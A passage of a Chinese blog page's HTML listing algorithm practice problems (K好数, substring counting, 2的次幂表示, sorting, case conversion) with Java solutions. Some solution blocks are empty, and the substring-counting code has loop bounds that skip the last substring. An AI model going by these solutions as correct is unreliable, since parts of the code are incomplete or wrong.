class="line">已知一个正整数N，问从1~N中任选出三个数，他们的最小公倍数最大可以为多少。</span><br><span class="line"></span><br><span class="line">输入格式</span><br><span class="line">输入一个正整数N。</span><br><span class="line"></span><br><span class="line">输出格式</span><br><span class="line">输出一个整数，表示你找到的最小公倍数。</span><br><span class="line">样例输入</span><br><span class="line">9</span><br><span class="line">样例输出</span><br><span class="line">504</span><br><span class="line">数据规模与约定</span><br><span class="line">1 &lt;= N &lt;= 106。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">long</span> n = in.nextInt();</span><br><span class="line">        <span class="keyword">long</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;=<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="comment">// 2</span></span><br><span class="line">            result = n;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(n%<span class="number">2</span> == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="comment">// 3</span></span><br><span class="line">            result = n*(n-<span class="number">1</span>)*(n-<span class="number">2</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(n%<span class="number">3</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">// 6 5 4 3 2 1</span></span><br><span class="line">            result = (n-<span class="number">1</span>)*(n-<span class="number">2</span>)*(n-<span class="number">3</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 8 7 6 5 4 3 2 1</span></span><br><span class="line">            result = n*(n-<span class="number">1</span>)*(n-<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ALGO-3-K好数"><a href="#ALGO-3-K好数" class="headerlink" title="ALGO-3  K好数"></a>ALGO-3  K好数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">如果一个自然数N的K进制表示中任意的相邻的两位都不是相邻的数字，那么我们就说这个数是K好数。求L位K进制数中K好数的数目。例如K = 4，L = 2的时候，所有K好数为11、13、20、22、30、31、33 共7个。由于这个数目很大，请你输出它对1000000007取模后的值。</span><br><span class="line"></span><br><span class="line">输入格式</span><br><span class="line">输入包含两个正整数，K和L。</span><br><span class="line"></span><br><span class="line">输出格式</span><br><span class="line">输出一个整数，表示答案对1000000007取模后的值。</span><br><span class="line">样例输入</span><br><span class="line">4 2</span><br><span class="line">样例输出</span><br><span class="line">7</span><br><span class="line">数据规模与约定</span><br><span class="line">对于30%的数据，KL &lt;= 106；</span><br><span class="line"></span><br><span class="line">对于50%的数据，K &lt;= 16， L &lt;= 10；</span><br><span class="line"></span><br><span class="line">对于100%的数据，1 &lt;= K,L &lt;= 100。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> k = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span> l = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span> num[][] = <span class="keyword">new</span> <span class="keyword">int</span>[l][k];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; k;i++)&#123;</span><br><span class="line">            num[<span class="number">0</span>][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; l;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; k;j++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> x = <span class="number">0</span>;x &lt; k;x++)&#123;</span><br><span class="line">                    <span class="keyword">if</span> (x!=j-<span class="number">1</span>&amp;&amp;x!=j+<span class="number">1</span>) &#123;</span><br><span class="line">                        num[i][j] += num[i-<span class="number">1</span>][x];</span><br><span class="line">                        num[i][j] %= <span class="number">1000000007</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> output = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; k;i++)&#123;</span><br><span class="line">            output += num[l-<span class="number">1</span>][i];</span><br><span class="line">            output %= <span class="number">1000000007</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(output);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ALGO-4-结点选择"><a href="#ALGO-4-结点选择" class="headerlink" title="ALGO-4  结点选择"></a>ALGO-4  结点选择</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">有一棵 n 个节点的树，树上每个节点都有一个正整数权值。如果一个点被选择了，那么在树上和它相邻的点都不能被选择。求选出的点的权值和最大是多少？</span><br><span class="line"></span><br><span class="line">输入格式</span><br><span class="line">第一行包含一个整数 n 。</span><br><span class="line"></span><br><span class="line">接下来的一行包含 n 个正整数，第 i 个正整数代表点 i 的权值。</span><br><span class="line"></span><br><span class="line">接下来一共 n-1 行，每行描述树上的一条边。</span><br><span class="line"></span><br><span class="line">输出格式</span><br><span class="line">输出一个整数，代表选出的点的权值和的最大值。</span><br><span class="line">样例输入</span><br><span class="line">5</span><br><span class="line">1 2 3 4 5</span><br><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">2 4</span><br><span class="line">2 5</span><br><span class="line">样例输出</span><br><span class="line">12</span><br><span class="line">样例说明</span><br><span class="line">选择3、4、5号点，权值和为 3+4+5 = 12 。</span><br><span class="line">数据规模与约定</span><br><span class="line">对于20%的数据， n &lt;= 20。</span><br><span class="line"></span><br><span class="line">对于50%的数据， n &lt;= 1000。</span><br><span class="line"></span><br><span class="line">对于100%的数据， n &lt;= 100000。</span><br><span class="line"></span><br><span class="line">权值均为不超过1000的正整数。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ALGO-42-送分啦"><a href="#ALGO-42-送分啦" class="headerlink" title="ALGO-42 送分啦"></a>ALGO-42 送分啦</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　这题想得分吗？想，请输出“yes”；不想，请输出“no”。</span><br><span class="line">输出格式</span><br><span class="line">　　输出包括一行，为“yes”或“no”。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">"yes"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ALGO-90-出现次数最多的整数"><a href="#ALGO-90-出现次数最多的整数" class="headerlink" title="ALGO-90 出现次数最多的整数"></a>ALGO-90 出现次数最多的整数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">　　﻿问题描述</span><br><span class="line">　　编写一个程序，读入一组整数，这组整数是按照从小到大的顺序排列的，它们的个数N也是由用户输入的，最多不会超过20。然后程序将对这个数组进行统计，把出现次数最多的那个数组元素值打印出来。如果有两个元素值出现的次数相同，即并列第一，那么只打印比较小的那个值。</span><br><span class="line">　　输入格式：第一行是一个整数N，N £ 20；接下来有N行，每一行表示一个整数，并且按照从小到大的顺序排列。</span><br><span class="line">　　输出格式：输出只有一行，即出现次数最多的那个元素值。</span><br><span class="line">输入输出样例</span><br><span class="line">样例输入</span><br><span class="line">5</span><br><span class="line">100</span><br><span class="line">150</span><br><span class="line">150</span><br><span class="line">200</span><br><span class="line">250</span><br><span class="line">样例输出</span><br><span class="line">150</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> n = in.nextInt();</span><br><span class="line">        <span class="keyword">if</span>(n &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span>[] num = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">            num[i] = in.nextInt();</span><br><span class="line">            arr[num[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(num);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> min = num[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> max = num[n-<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span> temp = arr[min];</span><br><span class="line">        <span class="keyword">int</span> index = min;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = min;i &lt;= max;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[i]&gt;temp)&#123;</span><br><span class="line">                temp = arr[i];</span><br><span class="line">                index = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(index);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ALGO-84-大小写转换"><a href="#ALGO-84-大小写转换" class="headerlink" title="ALGO-84 大小写转换"></a>ALGO-84 大小写转换</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　编写一个程序，输入一个字符串（长度不超过20），然后把这个字符串内的每一个字符进行大小写变换，即将大写字母变成小写，小写字母变成大写，然后把这个新的字符串输出。</span><br><span class="line">　　输入格式：输入一个字符串，而且这个字符串当中只包含英文字母，不包含其他类型的字符，也没有空格。</span><br><span class="line">　　输出格式：输出经过转换后的字符串。</span><br><span class="line">输入输出样例</span><br><span class="line">样例输入</span><br><span class="line">AeDb</span><br><span class="line">样例输出</span><br><span class="line">aEdB</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String str = in.next();</span><br><span class="line">        <span class="keyword">char</span>[] strArr = str.toCharArray();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; strArr.length;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> ascii = (<span class="keyword">int</span>)strArr[i];</span><br><span class="line">            <span class="keyword">if</span>(ascii &gt;= <span class="number">97</span> &amp;&amp; ascii &lt;= <span class="number">122</span>)&#123;</span><br><span class="line">                <span class="comment">// 小写</span></span><br><span class="line">                ascii-=<span class="number">32</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(ascii &gt;= <span class="number">65</span> &amp;&amp; ascii &lt;= <span class="number">90</span>)&#123;</span><br><span class="line">                <span class="comment">// 大写</span></span><br><span class="line">                ascii+=<span class="number">32</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.print((<span class="keyword">char</span>) ascii);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ALGO-87-字串统计"><a href="#ALGO-87-字串统计" class="headerlink" title="ALGO-87  字串统计"></a>ALGO-87  字串统计</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　给定一个长度为n的字符串S，还有一个数字L，统计长度大于等于L的出现次数最多的子串（不同的出现可以相交），如果有多个，输出最长的，如果仍然有多个，输出第一次出现最早的。</span><br><span class="line">输入格式</span><br><span class="line">　　第一行一个数字L。</span><br><span class="line">　　第二行是字符串S。</span><br><span class="line">　　L大于0，且不超过S的长度。</span><br><span class="line">输出格式</span><br><span class="line">　　一行，题目要求的字符串。</span><br><span class="line"></span><br><span class="line">　　输入样例1：</span><br><span class="line">　　4</span><br><span class="line">　　bbaabbaaaaa</span><br><span class="line"></span><br><span class="line">　　输出样例1：</span><br><span class="line">　　bbaa</span><br><span class="line"></span><br><span class="line">　　输入样例2：</span><br><span class="line">　　2</span><br><span class="line">　　bbaabbaaaaa</span><br><span class="line"></span><br><span class="line">　　输出样例2：</span><br><span class="line">　　aa</span><br><span class="line">数据规模和约定</span><br><span class="line">　　n&lt;=60</span><br><span class="line">　　S中所有字符都是小写英文字母。</span><br><span class="line">提示</span><br><span class="line">　　枚举所有可能的子串，统计出现次数，找出符合条件的那个</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> L = in.nextInt();</span><br><span class="line">        String S = in.next();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(L &lt;=<span class="number">0</span> || L&gt;S.length())&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> num = -<span class="number">1</span>;</span><br><span class="line">        String str = <span class="string">""</span>;</span><br><span class="line">        String temp = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;S.length()-L;k++) &#123;</span><br><span class="line">            <span class="keyword">int</span> l=L+k;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;S.length()-l;i++) &#123;</span><br><span class="line">                temp=S.substring(i, i+l);</span><br><span class="line">                <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;S.length()-l;j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(temp.equals(S.substring(j, j+l)))</span><br><span class="line">                        count++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(num&lt;=count) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(num==count) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(str.length()&lt;temp.length())</span><br><span class="line">                            str=temp;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        num=count;</span><br><span class="line">                        str=temp;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ALGO-95-2的次幂表示"><a href="#ALGO-95-2的次幂表示" class="headerlink" title="ALGO-95 2的次幂表示"></a>ALGO-95 2的次幂表示</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　任何一个正整数都可以用2进制表示，例如：137的2进制表示为10001001。</span><br><span class="line">　　将这种2进制表示写成2的次幂的和的形式，令次幂高的排在前面，可得到如下表达式：137=2^7+2^3+2^0</span><br><span class="line">　　现在约定幂次用括号来表示，即a^b表示为a（b）</span><br><span class="line">　　此时，137可表示为：2（7）+2（3）+2（0）</span><br><span class="line">　　进一步：7=2^2+2+2^0 （2^1用2表示）</span><br><span class="line">　　3=2+2^0</span><br><span class="line">　　所以最后137可表示为：2（2（2）+2+2（0））+2（2+2（0））+2（0）</span><br><span class="line">　　又如：1315=2^10+2^8+2^5+2+1</span><br><span class="line">　　所以1315最后可表示为：</span><br><span class="line">　　2（2（2+2（0））+2）+2（2（2+2（0）））+2（2（2）+2（0））+2+2（0）</span><br><span class="line">输入格式</span><br><span class="line">　　正整数（1&lt;=n&lt;=20000）</span><br><span class="line">输出格式</span><br><span class="line">　　符合约定的n的0，2表示（在表示中不能有空格）</span><br><span class="line">样例输入</span><br><span class="line">137</span><br><span class="line">样例输出</span><br><span class="line">2(2(2)+2+2(0))+2(2+2(0))+2(0)</span><br><span class="line">样例输入</span><br><span class="line">1315</span><br><span class="line">样例输出</span><br><span class="line">2(2(2+2(0))+2)+2(2(2+2(0)))+2(2(2)+2(0))+2+2(0)</span><br><span class="line">提示</span><br><span class="line">　　用递归实现会比较简单，可以一边递归一边输出</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ALGO-97-排序"><a href="#ALGO-97-排序" class="headerlink" title="ALGO-97 排序"></a>ALGO-97 排序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　编写一个程序，输入3个整数，然后程序将对这三个整数按照从大到小进行排列。</span><br><span class="line">　　输入格式：输入只有一行，即三个整数，中间用空格隔开。</span><br><span class="line">　　输出格式：输出只有一行，即排序后的结果。</span><br><span class="line">　　输入输出样例</span><br><span class="line">样例输入</span><br><span class="line">9 2 30</span><br><span class="line">样例输出</span><br><span class="line">30 9 2</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; arr.length;i++)&#123;</span><br><span class="line">            arr[i] = in.nextInt();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; arr.length;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i+<span class="number">1</span>;j &lt; arr.length;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[i]&lt;arr[j])&#123;</span><br><span class="line">                    <span class="keyword">int</span> temp = arr[i];</span><br><span class="line">                    arr[i] = arr[j];</span><br><span class="line">                    arr[j] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; arr.length;i++)&#123;</span><br><span class="line">            System.out.print(arr[i]+<span class="string">" "</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ALGO-101-图形显示"><a href="#ALGO-101-图形显示" class="headerlink" title="ALGO-101 图形显示"></a>ALGO-101 图形显示</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 